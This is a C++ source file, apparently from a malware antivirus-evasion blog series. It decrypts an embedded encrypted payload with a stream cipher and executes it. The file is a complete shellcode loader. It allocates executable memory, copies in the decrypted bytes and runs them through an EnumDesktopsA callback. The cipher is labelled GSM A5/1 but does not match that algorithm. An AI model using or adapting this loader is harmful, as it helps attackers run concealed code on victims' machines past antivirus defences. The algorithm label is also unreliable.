/*
 * hack.cpp
 * encrypt/decrypt payload via GSM A5/1 algorithm
 * author: @cocomelonc
 * https://cocomelonc.github.io/malware/2023/03/24/malware-av-evasion-14.html
*/
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>

#define ROL(x, y) (((x) << (y)) | ((x) >> (32 - (y))))
#define A5_STEP(x, y, z) ((x & y) ^ (x & z) ^ (y & z))

void a5_1_decrypt(unsigned char *key, int key_len, unsigned char *cipher, int cipher_len, unsigned char *out) {
  // initialization
  unsigned int R1 = 0, R2 = 0, R3 = 0;
  for (int i = 0; i < 64; i++) {
    int feedback = ((key[i % key_len] >> (i / 8)) & 1) ^ ((R1 >> 18) & 1) ^ ((R2 >> 21) & 1) ^ ((R3 >> 22) & 1);
    R1 = (R1 << 1) | feedback;
    R2 = (R2 << 1) | ((R1 >> 8) & 1);
    R3 = (R3 << 1) | ((R2 >> 10) & 1);
  }
  // decryption
  for (int i = 0; i < cipher_len; i++) {
    int feedback = A5_STEP((R1 >> 8) & 1, (R2 >> 10) & 1, (R3 >> 10) & 1);
    unsigned char key_byte = 0;
    for (int j = 0; j < 8; j++) {
      int bit = A5_STEP((R1 >> 18) & 1, (R2 >> 21) & 1, (R3 >> 22) & 1) ^ feedback;
      key_byte |= bit << j;
      R1 = (R1 << 1) | bit;
      R2 = (R2 << 1) | ((R1 >> 8) & 1);
      R3 = (R3 << 1) | ((R2 >> 10) & 1);
    }
    out[i] = cipher[i] ^ key_byte;
  }
}

int main() {
  unsigned char key[] = {0x6d, 0x65, 0x6f, 0x77, 0x6d, 0x65, 0x6f, 0x77};
  unsigned char message[] = {0xe1, 0x51, 0x95, 0xbc, 0x37, 0xfd, 0xcd, 0xe9, 0x58, 0x50, 0x84, 0xfa, 0x2c, 0x21, 0x70, 0xb7, 0xa4, 0xf4, 0x2e, 0x9e, 0xb5, 0x27, 0x62, 0x6d, 0x27, 0xce, 0x7e, 0xfd, 0x6d, 0x6e, 0x01, 0x20, 0xf7, 0xbb, 0xdd, 0x68, 0x40, 0x7c, 0xb9, 0xe0, 0x8d, 0xc8, 0x61, 0x4b, 0xc9, 0xdd, 0x04, 0x1f, 0xe0, 0xe9, 0x55, 0x13, 0x9c, 0x9f, 0x49, 0x25, 0x76, 0xf7, 0x28, 0x4f, 0xbe, 0x05, 0x55, 0x68, 0x69, 0x05, 0xfb, 0xd6, 0x91, 0x9c, 0x6b, 0x26, 0x09, 0xf4, 0x5f, 0x44, 0x3d, 0x33, 0x38, 0x42, 0xc2, 0x2a, 0x80, 0x1a, 0x0c, 0xbd, 0xd4, 0xf3, 0x3c, 0xec, 0x05, 0xeb, 0xd4, 0x10, 0xbb, 0xca, 0x82, 0x01, 0x06, 0x88, 0xe5, 0x65, 0xe3, 0xdc, 0xfe, 0x77, 0x33, 0xf9, 0x64, 0xd7, 0x80, 0x09, 0x84, 0xd5, 0xc9, 0x1c, 0x09, 0xfe, 0xc3, 0x6e, 0x11, 0x0b, 0x36, 0x9c, 0x5c, 0xa1, 0xd6, 0x48, 0x34, 0xe1, 0x08, 0x70, 0xc1, 0xa6, 0x11, 0x91, 0x49, 0x0f, 0x55, 0x15, 0x61, 0x38, 0xe5, 0x70, 0xd9, 0x7e, 0x0d, 0x02, 0x46, 0x74, 0x58, 0xc5, 0x3b, 0xc5, 0x61, 0x76, 0x58, 0x3b, 0x41, 0xa3, 0x00, 0x65, 0x48, 0x0b, 0x80, 0x36, 0xbe, 0x43, 0x9f, 0x18, 0xe8, 0x3e, 0x41, 0x8e, 0x68, 0x5c, 0x08, 0x00, 0xda, 0x6e, 0x11, 0x0b, 0x06, 0x9c, 0x5c, 0xa1, 0xd0, 0x44, 0x5d, 0x69, 0x18, 0x1f, 0x58, 0x50, 0x11, 0x08, 0xc1, 0x5b, 0x55, 0x4e, 0xe8, 0x83, 0xe9, 0x25, 0x69, 0x12, 0xbe, 0xe1, 0x52, 0x11, 0x09, 0xda, 0x3c, 0x5c, 0x9f, 0xb2, 0xe9, 0x4c, 0xfa, 0xd7, 0xbf, 0x1c, 0x48, 0xcd, 0x91, 0x50, 0x80, 0x02, 0x14, 0x2a, 0xe8, 0x8d, 0x90, 0xfb, 0x28, 0x40, 0x41, 0x3f, 0x46, 0xdd, 0xd5, 0x89, 0x03, 0x14, 0x14, 0xe8, 0x31, 0xcc, 0x44, 0x92, 0x05, 0xc2, 0x57, 0x0d, 0xaf, 0x85, 0xc8, 0x33, 0xdd, 0x55, 0x1a, 0xf0, 0xb0, 0xa7, 0x7e, 0xbf, 0x94, 0x4c, 0x6f, 0x3f, 0x27, 0xad, 0x6f, 0x71, 0x7b, 0xd7, 0x21, 0x05, 0x38, 0x76, 0x6e, 0x6f, 0x5f, 0x37, 0x50, 0xc0, 0x10, 0x92};
  int key_len = sizeof(key);

  int message_len = sizeof(message);
  unsigned char decrypted[message_len];
  a5_1_decrypt(key, key_len, message, message_len, decrypted);

  printf("\ndecrypted message:\n");
  for (int i = 0; i < message_len; i++) {
    printf("%02x ", decrypted[i]);
  }
  printf("\n\n");

  LPVOID mem = VirtualAlloc(NULL, message_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  RtlMoveMemory(mem, decrypted, message_len);
  EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, (LPARAM)NULL);
  return 0;
}

